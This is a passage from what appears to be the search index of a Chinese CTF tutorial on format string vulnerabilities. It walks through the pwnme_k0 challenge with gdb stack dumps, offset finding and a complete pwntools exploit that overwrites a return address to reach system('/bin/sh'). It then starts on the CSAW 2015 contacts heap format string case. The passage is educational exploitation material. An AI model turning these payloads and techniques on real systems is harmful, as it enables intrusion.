4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _QWORD * )( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_17","text":"\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_18","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username ( max lenth:20 ) : aaaaaaaa Input your password ( max lenth:20 ) : %p%p%p%p%p%p%p%p%p%p Register Success!! 1 .Sh0w Account Infomation! 2 .Ed1t Account Inf0mation! 3 .QUit sangebaimao: ( >error options 1 .Sh0w Account Infomation! 2 .Ed1t Account Inf0mation! 3 .QUit sangebaimao: ( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386:x86-64 ] \u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [ rbp+0x10 ] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [ rip+0x20184a ] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [ rip+0x20184a ] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp , $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_19","text":"\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f**\u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash**, \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn","title":"\u4fee\u6539\u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_20","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context . log_level = 'debug' p = process ( \"./pwnme_k0\" ) elf = ELF ( \"./pwnme_k0\" ) # leak stack addr payload = 'a' * 0x8 + \"%6$p\" p . recvuntil ( \"20): \\n \" ) p . send ( payload ) p . recvuntil ( \"20): \\n \" ) p . send ( payload ) p . recvuntil ( '>' ) #gdb.attach(p,'b printf') p . sendline ( '1' ) p . recvuntil ( 'a' * 0x8 ) stack_leak = int ( p . recv ( 14 ), 16 ) - 0x38 log . info ( \"stack_leak:\" + hex ( stack_leak )) # hijack retaddr payload1 = p64 ( stack_leak ) payload2 = \" %2218d %8$hn\" p . recvuntil ( '>' ) p . sendline ( '2' ) p . recvuntil ( \"20): \\n \" ) p . sendline ( payload1 ) p . recvuntil ( \"20): \\n \" ) p . sendline ( payload2 ) p . recvuntil ( '>' ) p . sendline ( '1' ) p . interactive () \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 \u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_21","text":"","title":"\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_22","text":"\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_23","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_24","text":"\u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO \u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_25","text":"\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1 ( v2 + 8 , * ( _DWORD * )( v2 + 72 ), * ( _DWORD * )( v2 + 4 ), * ( char ** ) v2 );","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_26","text":"\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki \u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 \u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo 